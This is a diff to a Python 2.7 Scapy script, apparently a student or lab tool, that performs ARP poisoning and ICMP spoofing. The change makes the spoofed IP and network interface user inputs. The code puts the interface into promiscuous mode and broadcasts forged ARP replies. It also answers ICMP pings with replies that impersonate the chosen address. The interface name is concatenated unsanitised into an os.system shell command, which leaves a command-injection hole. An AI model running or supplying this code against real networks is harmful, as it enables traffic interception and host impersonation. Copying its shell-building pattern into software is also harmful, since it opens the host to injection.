@@ -1,13 +1,20 @@
+#Setting ICMP spoofing for ARP poisoning
+#Ricky Hosfelt
+#built for Python 2.7.5
+
 #importing modules
 import socket #to caputre and send packets
 from scapy.all import * #for packet construction/parsing
 import os
 
+interfaceName = raw_input("interface name: ")
+spoofedIP = raw_input("Spoofed IP: ")
+
 #set up raw socket receiver, receives in promosicious mode and all levels
-ret = os.system("ifconfig enp0s17 promisc")
+ret = os.system("ifconfig " + interfaceName +" promisc")
 
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
-sendp(Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst="ff:ff:ff:ff:ff:ff",psrc="10.42.42.42",pdst="255.255.255.255",op=0x2,hwtype=0x01,ptype=0x800))
+sendp(Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst="ff:ff:ff:ff:ff:ff",psrc=spoofedIP,pdst="255.255.255.255",op=0x2,hwtype=0x01,ptype=0x800))
 #receives packet and other network information, returns byte array
 def packet_recv(sock):
     pkt_array = []
@@ -54,7 +61,7 @@ def arp_spoof(pkt):#looks for an arp request for IP, and sends spoofed reply
     if ((pkt[14] == 0x00) and (pkt[15] == 0x01) and (pkt[16]==0x08) and (pkt[17]==0x00) and (pkt[20]==0x00) and (pkt[21] == 0x01)):
         srcIParp=''
         if((pkt[38] == 10) and (pkt[39] == 42) and (pkt[40] == 42) and (pkt[41]== 42)):
-            sendp(Ether(src="aa:bb:cc:dd:ee:ff",dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst="ff:ff:ff:ff:ff:ff",psrc="10.42.42.42",pdst="255.255.255.255",op=0x2,hwtype=0x01,ptype=0x800),count=5)
+            sendp(Ether(src="aa:bb:cc:dd:ee:ff",dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst="ff:ff:ff:ff:ff:ff",psrc=spoofedIP,pdst="255.255.255.255",op=0x2,hwtype=0x01,ptype=0x800),count=5)
 
 def icmp_spoof(pkt, srcIP, smac): #looks for ICMP request copies id/seq/data
                                   #send spoofed ICMP packet with copied info
@@ -71,7 +78,7 @@ def icmp_spoof(pkt, srcIP, smac): #looks for ICMP request copies id/seq/data
         for i in data:
             data_out+=chr(i)
         print("sending spoofed ICMP reply")
-        sendp(Ether(src="aa:bb:cc:dd:ee:ff",dst=smac)/IP(src="10.42.42.42",dst=srcIP)/ICMP(type=0,id=ider,seq=seqer)/data_out)
+        sendp(Ether(src="aa:bb:cc:dd:ee:ff",dst=smac)/IP(src=spoofedIP,dst=srcIP)/ICMP(type=0,id=ider,seq=seqer)/data_out)
 #continue sensing network (infinite while loop)
 pkt_array = []
 while True:
